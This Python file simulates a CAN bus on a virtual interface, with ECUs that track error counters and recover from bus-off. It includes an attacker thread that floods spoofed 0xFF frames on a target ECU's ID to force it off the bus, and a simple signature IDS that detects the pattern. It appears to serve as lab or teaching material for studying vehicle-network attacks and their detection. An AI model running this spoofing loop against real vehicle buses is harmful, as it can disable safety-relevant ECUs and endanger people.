import can
import time
import random
import threading

ENABLE_RECOVERY = True              # Toggle the 128-idle-window recovery
RECOVERY_BY_IDLE_COUNT = False      # Switch recover on time or idle window
RECOVERY_IDLE_COUNT = 128           # Standard CAN recovery duration
ENABLE_IDS_SIGNATURE = True         # Toggle the 0xFF pattern detection

class CanController():
    def __init__(self, bus_interface: str, bus_type: str):
        self.__bus = can.interface.Bus(bus_interface, interface=bus_type, 
                                       receive_own_messages=True,
                                       include_error_frames=True)
    def get_bus(self):
        return self.__bus

class CanECU():
    def __init__(self, canController: CanController, can_id: int, time_out: float):
        self.__bus = canController.get_bus()
        self.__isRunning = False
        self.__id = can_id
        self.__timeout = time_out
        self.__tec = 0
        self.__rec = 0
        self.__state = can.BusState.ACTIVE 

    def __update_error_state(self, tec_inc=0, rec_inc=0):
        last_state = self.__state
        self.__tec = min(256, self.__tec + tec_inc) if tec_inc > 0 else max(0, self.__tec + tec_inc)
        self.__rec = min(256, self.__rec + rec_inc) if rec_inc > 0 else max(0, self.__rec + rec_inc)

        if self.__tec >= 256:
            self.__state = can.BusState.ERROR
        elif self.__tec > 127 or self.__rec > 127:
            self.__state = can.BusState.PASSIVE
        else:
            self.__state = can.BusState.ACTIVE

        if self.__state != last_state:
            print(f"!!! [STATE CHANGE] ECU {self.__id}: {last_state.name} -> {self.__state.name} (TEC: {self.__tec}, REC: {self.__rec}) !!!")

    def __reset_state(self):
        # Flush buffer of old attack frames before returning to bus
        while self.__bus.recv(timeout=0): pass
        self.__tec = self.__rec = 0
        self.__update_error_state()

    def __run_recovery(self):
        """Standard CAN Recovery: Wait for 128 occurrences of 11 recessive bits (idle)."""

        print(f"--- ECU {self.__id}: Attempting Recovery (Waiting for {RECOVERY_IDLE_COUNT} idle slots)... ---")
        idles = 0
        while idles < RECOVERY_IDLE_COUNT:
            if self.__bus.recv(timeout=0.01) is None:
                idles += 1
        self.__reset_state()

    def __ecu_action(self):
        i = self.__start
        last_time_active = time.time()
        while self.__isRunning:

            if ENABLE_RECOVERY and self.__state == can.BusState.ERROR:
                if RECOVERY_BY_IDLE_COUNT:
                    self.__run_recovery()
                elif time.time() - last_time_active > 5:
                    self.__reset_state()

                continue

            last_time_active = time.time()

            # PHASE 1: TRANSMIT
            if i == 1:
                msg_data = random.randint(0, 250).to_bytes(1, 'big')
                self.__bus.send(can.Message(arbitration_id=self.__id, data=msg_data, is_extended_id=False))
                
                end_time = time.time() + 0.05
                collision_detected = False
                while time.time() < end_time:
                    if self.__state == can.BusState.ERROR: break
                    rx_msg = self.__bus.recv(timeout=0.01)
                    if rx_msg and rx_msg.arbitration_id == self.__id:
                        if rx_msg.data != msg_data:
                            self.__update_error_state(tec_inc=8)
                            collision_detected = True
                            break
                        else:
                            self.__update_error_state(tec_inc=-1)

                if self.__state != can.BusState.ERROR:
                #if not collision_detected and self.__state != can.BusState.ERROR:
                    print(f"[{self.__state.name}]\tECU {self.__id} SENT: {msg_data.hex()} (TEC: {self.__tec})")

            # PHASE 2: RECEIVE
            else:
                rx_msg = self.__bus.recv(timeout=0.1)
                if rx_msg:
                    if rx_msg.is_error_frame:
                        self.__update_error_state(rec_inc=1)
                    elif rx_msg.arbitration_id != self.__id:
                        self.__update_error_state(rec_inc=-1)
                        # Signature IDS check
                        if ENABLE_IDS_SIGNATURE and list(rx_msg.data) == [0xFF]*8:
                            print(f"\a\t\t[IDS ALERT] ECU {self.__id} detected attack pattern on ID {rx_msg.arbitration_id}!")
                        elif list(rx_msg.data) != [0xFF]*8:
                            print(f"\t\tECU {self.__id} RCVD from {rx_msg.arbitration_id}: {rx_msg.data.hex()} (REC: {self.__rec})")

            i = (i + 1) % 2
            time.sleep(self.__timeout)

    def __bus_off_attacker(self):
        time.sleep(3)
        print(f"Attacker listening for ID {self.__target_id}...")
        target_id = self.__target_id
        attack_data = bytes([0xFF]*8)
        last_seen_target = time.time()
        is_attacking = True

        while self.__isRunning:
            msg = self.__bus.recv(timeout=0.1)
            if msg and msg.arbitration_id == target_id:
                if list(msg.data) != list(attack_data):
                    last_seen_target = time.time()
                    for _ in range(5): 
                        self.__bus.send(can.Message(arbitration_id=target_id, data=attack_data, is_extended_id=False))
            
            if is_attacking and time.time() - last_seen_target > 2.0:
                print(f"--- ATTACKER: Target {target_id} has been silent for 2s. Ceasing fire. ---")
                is_attacking = False

            if not is_attacking and msg and msg.arbitration_id == target_id and list(msg.data) != list(attack_data):
                print(f"--- ATTACKER: Target {target_id} RE-APPEARED. Resuming attack! ---")
                is_attacking = True
            continue

    def start_ecu(self, evil=False, start=0, target_id=100):
        self.__isRunning = True
        self.__start = start
        if evil:
            self.__target_id = target_id
            threading.Thread(target=self.__bus_off_attacker, daemon=True).start()
        else:
            threading.Thread(target=self.__ecu_action, daemon=True).start()

if __name__ == "__main__":
    ecu1 = CanECU(CanController('vcan0', 'socketcan'), 100, 0.1) 
    ecu2 = CanECU(CanController('vcan0', 'socketcan'), 200, 0.2) 
    ecu3 = CanECU(CanController('vcan0', 'socketcan'), 300, 0.0) 
    ecu4 = CanECU(CanController('vcan0', 'socketcan'), 400, 0.3) 
    
    ecu1.start_ecu(start=1)
    ecu2.start_ecu(start=0)
    ecu3.start_ecu(evil=True, target_id=100)
    ecu4.start_ecu(start=0)

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping...")
